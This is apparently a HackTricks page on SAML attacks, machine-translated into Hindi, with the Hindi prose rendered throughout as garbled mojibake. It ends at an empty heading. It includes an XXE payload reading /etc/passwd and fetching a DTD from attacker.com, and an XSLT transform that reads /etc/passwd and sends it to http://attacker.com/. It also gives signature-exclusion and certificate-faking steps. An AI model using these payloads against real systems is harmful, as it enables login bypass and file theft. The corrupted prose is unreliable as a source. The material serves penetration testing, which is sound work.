# SAML рд╣рдорд▓реЗ

## SAML рд╣рдорд▓реЗ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## рдЙрдкрдХрд░рдг

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ рдПрдХ URL рдпрд╛ URL рд╕реВрдЪреА рд▓реЗ рд╕рдХрддрд╛ рд╣реИ рдФрд░ SAML рд╕реАрдорд╛ URL рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## XML рд░рд╛рдЙрдВрдб-рдЯреНрд░рд┐рдк

XML рдореЗрдВ XML рдХрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣рд┐рд╕реНрд╕рд╛ рдореЗрдореЛрд░реА рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд┐рд░ рдХреБрдЫ encoding/decoding рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рддреА рд╣реИред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рдЙрд╕ encoding/decoding рдХреЛ рдбреЗрдЯрд╛ рдирд╣реАрдВ рдмрджрд▓рдирд╛ рдЪрд╛рд╣рд┐рдП рд▓реЗрдХрд┐рди рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдХреЗ рдЖрдзрд╛рд░ рдкрд░, **рдЬрд┐рд╕ рдбреЗрдЯрд╛ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ рдФрд░ рдореВрд▓ рдбреЗрдЯрд╛ рд╡реЗ рдПрдХ рд╕рдорд╛рди рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ**ред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
рдпрджрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ REXML 3.2.4 рдпрд╛ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдП, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛:
```
First child in original doc: Y
First child after round-trip: Z
```
рдпрд╣рд╛рдБ рдпрд╣ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ REXML рдиреЗ рдЙрдкрд░реЛрдХреНрдд рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕реЗ рдореВрд▓ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рдХреИрд╕реЗ рджреЗрдЦрд╛:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (561).png>)

рдФрд░ рдпрд╣ рдЙрд╕реЗ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдФрд░ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рдПрдХ рджреМрд░ рдХреЗ рдмрд╛рдж рдХреИрд╕реЗ рджреЗрдЦрд╛:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (562).png>)

рдЗрд╕ рд╡реНрдпрдХреНрддрд┐рдЧрддрддрд╛ рдФрд░ рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд▓рдкреЗрдЯрди рд╣рдорд▓реЗ

**XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд▓рдкреЗрдЯрди рд╣рдорд▓реЛрдВ (XSW)** рдореЗрдВ, рдкреНрд░рддрд┐рдХреВрд▓ рдПрдХ рд╡рд┐рдХрд░реНрд╖рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рджреЛ рд╡рд┐рднрд┐рдиреНрди рдЪрд░рдгреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдорд╛рдиреНрдпрддрд╛** рдФрд░ **рдХрд╛рд░реНрдп рдХреЛ рдЖрд╣реНрд╡рд╛рди**ред рдпреЗ рд╣рдорд▓реЗ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕рдВрд░рдЪрдирд╛ рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рд╣рдорд▓рд╡рд╛рджреА **рдЬрд╛рд▓реА рддрддреНрд╡** рдбрд╛рд▓рддрд╛ рд╣реИ рдЬреЛ XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдорд╛рдиреНрдпрддрд╛ рдХреЛ рдЦрддрд░реЗ рдореЗрдВ рдирд╣реАрдВ рдбрд╛рд▓рддрд╛ред рдпрд╣ рдорд╛рдирд┐рдХреА рдЙрд╕ рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рддрддреНрд╡реЛрдВ рдХреЗ рдмреАрдЪ рдПрдХ рдЕрд╕рдВрдЧрддрд┐ рдмрдирд╛рдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИ рдЬреЛ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд░реНрдХ** рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд┐рдП рдЧрдП рддрддреНрд╡реЛрдВ рдФрд░ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рдореЙрдбреНрдпреВрд▓** рджреНрд╡рд╛рд░рд╛ рдЬрд╛рдВрдЪреЗ рдЧрдП рддрддреНрд╡реЛрдВ рдХреЗ рдмреАрдЪред рдЗрд╕ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЬрдмрдХрд┐ XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ рдорд╛рдиреНрдп рд╣реИ рдФрд░ рд╕рддреНрдпрд╛рдкрди рдкрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рддрд░реНрдХ **рдЬрд╛рд▓реА рддрддреНрд╡реЛрдВ** рдХреЛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рд╣рдорд▓рд╡рд╛рджреА XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА **рдЕрдЦрдВрдбрддрд╛ рд╕рдВрд░рдХреНрд╖рдг** рдФрд░ **рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ рдЫрд▓рдХрд░, **рдХрд┐рд╕реА рднреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рдЕрдВрд╢рд╛рддреНрдордХ рдбрд╛рд▓рдиреЗ** рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## рдЙрдкрдХрд░рдг

рдЖрдк рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML рд░реЗрдбрд░**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд XXE рдЬреЛрдЦрд┐рдо рдФрд░ SAML рдЬреЛрдЦрд┐рдореЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рдЯреЙрдХ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ XSLT

XSLT рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЬрд╛рдПрдВ:

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

рдПрдХреНрд╕рдЯреЗрдВрд╕рд┐рдмрд▓ рд╕реНрдЯрд╛рдЗрд▓рд╢реАрдЯ рднрд╛рд╖рд╛ рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдореЗрд╢рди (XSLT) рдХрд╛ рдЙрдкрдпреЛрдЧ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рд╛рд░реВрдкреЛрдВ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ HTML, JSON, рдпрд╛ PDFред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **XSLT рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдореЗрд╢рди рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рд╕рддреНрдпрд╛рдкрди рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛ рд╕рдлрд▓ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдПрдХ рд╡реИрдз рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЗ рдмрд┐рдирд╛; рдПрдХ рд╕реНрд╡-рд╕рд╛рдЗрди рдпрд╛ рдЕрд╡реИрдз рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкрд░реНрдпрд╛рдкреНрдд рд╣реИ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдПред

рдпрд╣рд╛рдБ рдЖрдк рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЬреЛрдЦрд┐рдореЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдПрдХ **POC** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдЦрдВрдб рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЖрдк рдкреЗрд▓реЛрдб рдХреЗ рд▓рд┐рдП рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### рдЙрдкрдХрд░рдг

рдЖрдк рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SAML рдЕрдиреБрд░реЛрдз рд╕реЗ POC рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд XSLT рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕ рдЯреЙрдХ рдХреЛ рднреА рджреЗрдЦреЗрдВ: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЕрдкрд╡рд╛рдж <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЕрдкрд╡рд╛рдж** рдпрд╣ рджреЗрдЦрддрд╛ рд╣реИ рдХрд┐ SAML рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреИрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рддрддреНрд╡ рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реИ, рддреЛ **рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рддреНрдпрд╛рдкрди рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ**, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рд╡рд┐рдХрд▓реНрдкрдиреАрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдпрдд: рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### рдЙрдкрдХрд░рдг <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

рдЖрдк рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдФрд░ `рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣рдЯрд╛рдПрдВ` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рд╛рде **рд╕рднреА** рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рддрддреНрд╡ рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЕрдиреБрд░реЛрдз рдХреЛ рд▓рдХреНрд╖реНрдп рдХреА рдУрд░ рдмрдврд╝рдиреЗ рджреЗрдВред рдпрджрд┐ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ

## рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдлреЗрдХрд┐рдВрдЧ <a href="#certificate-faking" id="certificate-faking"></a>

рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдлреЗрдХрд┐рдВрдЧ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ (SP) рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХреЗ рдХрд┐ рдПрдХ SAML рд╕рдВрджреЗрд╢ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдкрд╣рдЪрд╛рди рдкреНрд░рджрд╛рддрд╛ (IdP) рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд┐рдд рд╣реИ**ред рдЗрд╕рдореЗрдВ рдПрдХ ***рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕рд╕реЗ SP рдФрд░ IdP рдХреЗ рдмреАрдЪ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рд╕рддреНрдпрд╛рдкрди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдлреЗрдХрд┐рдВрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВ
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдг рд╡рд┐рд╡рд░рдгрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди:

1. SAML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХрд░реЗрдВред
2. рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣реИ, рддреЛ `рд╕реЗрдВрдб рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЯреВ SAML рд░реЗрдбрд░ рд╕рд░реНрдЯреНрд╕` рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЛ SAML рд░реЗрдбрд░ рд╕рд░реНрдЯреНрд╕ рдХреЛ рднреЗрдЬреЗрдВред
3. SAML рд░реЗрдбрд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯреНрд╕ рдЯреИрдм рдореЗрдВ, рдЖрдпрд╛рддрд┐рдд рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ `рд╕реЗрд╡ рдПрдВрдб рд╕реЗрд▓реНрдл-рд╕рд╛рдЗрди` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдореВрд▓ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХрд╛ рдПрдХ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреНрд▓реЛрди рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
4. рдмрд░реНрдк рдХреЗ рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдП рдЧрдП рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЬрд╛рдПрдВред XML рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ рдирдпрд╛ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдЪреБрдиреЗрдВред
5. `рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рд╣рдЯрд╛рдПрдВ` рдмрдЯрди рдХреЗ рд╕рд╛рде рдХрд┐рд╕реА рднреА рдореМрдЬреВрджрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреЛ рд╣рдЯрд╛рдПрдВред
6. рд╕рдВрджреЗрд╢ рдпрд╛ рджрд╛рд╡рд╛ рдирдП рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд┐рдд рдХрд░реЗрдВ **`(рд░реА-)рд╕рд╛рдЗрди рдореИрд╕реЗрдЬ`** рдпрд╛ **`(рд░реА-)рд╕рд╛рдЗрди рдЕрд╕рд░реНрд╢рди`** рдмрдЯрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЬреИрд╕реЗ рдЙрдкрдпреБрдХреНрдд рд╣реЛред
7. рд╣рд╕реНрддрд╛рдХреНрд╖рд┐рдд рд╕рдВрджреЗрд╢ рдХреЛ рдЖрдЧреЗ рднреЗрдЬреЗрдВред рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ SP рдЖрдкрдХреЗ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд┐рдд рд╕рдВрджреЗрд╢ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, SAML рд╕рдВрджреЗрд╢реЛрдВ рдХреЗ рдорд╛рдиреНрдпрд╛рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд рджреЛрд╖реЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред


## рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рднреНрд░рд╛рдВрддрд┐ / рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рд▓рдХреНрд╖реНрдп рднреНрд░рд╛рдВрддрд┐ <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

